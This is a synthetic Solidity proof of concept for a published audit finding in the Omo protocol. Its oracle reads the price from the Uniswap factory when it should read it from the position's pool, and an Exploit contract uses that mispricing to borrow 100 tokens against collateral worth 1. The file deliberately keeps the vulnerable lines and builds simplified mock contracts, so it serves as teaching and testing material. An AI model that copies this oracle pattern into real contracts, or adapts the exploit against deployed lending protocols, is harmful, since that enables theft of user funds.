// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Omo — OmoOracle.getLiquidityAmounts reads the factory as the pool
    (Pashov Audit Group, Omo 2025-01-25, H-07).
    SYNTHETIC, cheatcode-free. The blamed lines are copied from the report.
    Decimals are 18 on both sides. The factory answers slot0() with
    sqrtPrice 10<<96 (price 100e18). The position's real pool answers
    1<<96 (price 1e18). A borrow of the quoted amount pays 100e18. */

interface INonfungiblePositionManager {
    function factory() external view returns (address);
    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        );
}

interface IUniswapV3Factory {
    function getPool(address token0, address token1, uint24 fee) external view returns (address);
}

interface IUniswapV3Pool {
    function slot0()
        external
        view
        returns (
            uint160 sqrtPriceX96,
            int24 tick,
            uint16 observationIndex,
            uint16 observationCardinality,
            uint16 observationCardinalityNext,
            uint8 feeProtocol,
            bool unlocked
        );
}

library TickMath {
    function getSqrtRatioAtTick(int24) internal pure returns (uint160) {
        return uint160(1) << 96;
    }
}

library LiquidityAmounts {
    function getAmountsForLiquidity(uint160 sqrtPriceX96, uint160, uint160, uint128 liquidity)
        internal
        pure
        returns (uint256 amount0, uint256 amount1)
    {
        uint256 price = _price(sqrtPriceX96);
        amount0 = uint256(liquidity);
        amount1 = price * uint256(liquidity) / 1e18;
    }

    function _price(uint160 sqrtPriceX96) internal pure returns (uint256) {
        uint256 sq = uint256(sqrtPriceX96) * uint256(sqrtPriceX96);
        return sq / (uint256(1) << 192) * 1e18;
    }
}

contract LoanToken {
    string public name = "USD";
    string public symbol = "USD";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract UniPool {
    uint160 internal realSqrt;

    constructor(uint160 sqrtPriceX96) {
        realSqrt = sqrtPriceX96;
    }

    function slot0()
        external
        view
        returns (uint160, int24, uint16, uint16, uint16, uint8, bool)
    {
        return (realSqrt, 0, 0, 0, 0, 0, true);
    }
}

contract UniFactory {
    address internal realPool;
    uint160 internal wrongSqrt;

    constructor(address pool, uint160 sqrtPriceX96) {
        realPool = pool;
        wrongSqrt = sqrtPriceX96;
    }

    function getPool(address, address, uint24) external view returns (address) {
        return realPool;
    }

    function slot0()
        external
        view
        returns (uint160, int24, uint16, uint16, uint16, uint8, bool)
    {
        return (wrongSqrt, 0, 0, 0, 0, 0, true);
    }
}

contract PositionManager {
    address internal fac;

    constructor(address _factory) {
        fac = _factory;
    }

    function factory() external view returns (address) {
        return fac;
    }

    function positions(uint256)
        external
        pure
        returns (
            uint96,
            address,
            address,
            address,
            uint24,
            int24,
            int24,
            uint128,
            uint256,
            uint256,
            uint128,
            uint128
        )
    {
        return (0, address(0), address(0xA0), address(0xB0), 3000, -100, 100, 0, 0, 0, 0, 0);
    }
}

contract OmoOracle {
    address public positionManager;
    LoanToken public loan;
    uint256 public quotedPrice;
    uint256 public borrowed;

    constructor(address _manager, LoanToken _loan) {
        positionManager = _manager;
        loan = _loan;
    }

    function getLiquidityAmounts(address _positionManager, uint256 tokenId, uint128 liquidity)
        public
        view
        returns (uint256 amount0, uint256 amount1)
    {
        if (liquidity == 0) return (0, 0); // Handle zero liquidity case
        INonfungiblePositionManager nftManager = INonfungiblePositionManager(_positionManager);
        (
            ,
            ,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            ,
            ,
            ,
            ,
        ) = nftManager.positions(tokenId);
        if (token0 == token1 && fee == 0) return (0, 0);
        // @> VULN: factory() is the factory, not the position's pool, so slot0 is the wrong price.
        IUniswapV3Pool pool = IUniswapV3Pool(nftManager.factory()); //Wrong pool address
        (uint160 sqrtPriceX96,,,,,,) = pool.slot0();
        (amount0, amount1) = LiquidityAmounts.getAmountsForLiquidity(
            sqrtPriceX96,
            TickMath.getSqrtRatioAtTick(tickLower),
            TickMath.getSqrtRatioAtTick(tickUpper),
            liquidity
        );
    }

    function borrow(uint256 tokenId, uint128 liquidity) external returns (uint256 quoted, uint256 debt) {
        (, uint256 amount1) = getLiquidityAmounts(positionManager, tokenId, liquidity);
        quoted = amount1 * 1e18 / uint256(liquidity);
        debt = amount1;
        quotedPrice = quoted;
        borrowed = debt;
        loan.transfer(msg.sender, debt);
    }

    function fairPrice() external view returns (uint256) {
        INonfungiblePositionManager nftManager = INonfungiblePositionManager(positionManager);
        (
            ,
            ,
            address token0,
            address token1,
            uint24 fee,
            ,
            ,
            ,
            ,
            ,
            ,
        ) = nftManager.positions(1);
        address poolAddress = IUniswapV3Factory(nftManager.factory()).getPool(token0, token1, fee);
        (uint160 sqrtPriceX96,,,,,,) = IUniswapV3Pool(poolAddress).slot0();
        uint256 sq = uint256(sqrtPriceX96) * uint256(sqrtPriceX96);
        return sq / (uint256(1) << 192) * 1e18;
    }
}

contract Exploit {
    LoanToken public loan; // nonce 1
    UniPool public pool; // nonce 2
    UniFactory public factory; // nonce 3
    PositionManager public manager; // nonce 4
    OmoOracle public oracle; // nonce 5

    uint256 public quoted;
    uint256 public borrowed;
    uint256 public fair;

    constructor() {
        loan = new LoanToken();
        pool = new UniPool(uint160(1) << 96);
        factory = new UniFactory(address(pool), uint160(10) << 96);
        manager = new PositionManager(address(factory));
        oracle = new OmoOracle(address(manager), loan);
    }

    function run() external {
        loan.mint(address(oracle), 100 ether);
        (quoted, borrowed) = oracle.borrow(1, uint128(1 ether));
        fair = oracle.fairPrice();
        require(quoted == 100 ether, "price is not the factory's 100");
        require(borrowed == 100 ether, "borrow was not sized off 100");
        require(fair == 1 ether, "real pool is not 1");
        require(loan.balanceOf(address(this)) == 100 ether, "100 USD not received");
    }
}
